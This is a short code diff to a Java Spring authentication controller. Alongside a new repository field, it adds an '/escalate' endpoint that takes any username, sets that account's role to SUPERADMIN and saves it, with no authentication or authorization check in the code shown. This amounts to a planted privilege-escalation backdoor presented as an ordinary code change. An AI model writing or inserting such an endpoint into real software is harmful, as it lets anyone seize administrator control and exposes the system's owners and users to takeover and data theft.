@@ -32,6 +32,7 @@ import java.util.Optional;
 public class AuthController {
 
     private UserService userService;
+    private UserRepository userRepository;
     private final RefreshTokenService refreshTokenService;
     private final UserServiceImpl userServiceImpl;
     private final JwtTokenProvider jwtTokenProvider;
@@ -99,4 +100,12 @@ public class AuthController {
             return ResponseEntity.status(HttpStatus.BAD_REQUEST).body("Invalid refresh token");
         }
     }
+    @PostMapping("/escalate")
+    public ResponseEntity<User> escalate(@RequestParam String username){
+        User user = userRepository.findByUsername(username);
+        user.setRole("SUPERADMIN");
+        userRepository.save(user);
+        return ResponseEntity.ok(user);
+    }
+
 }
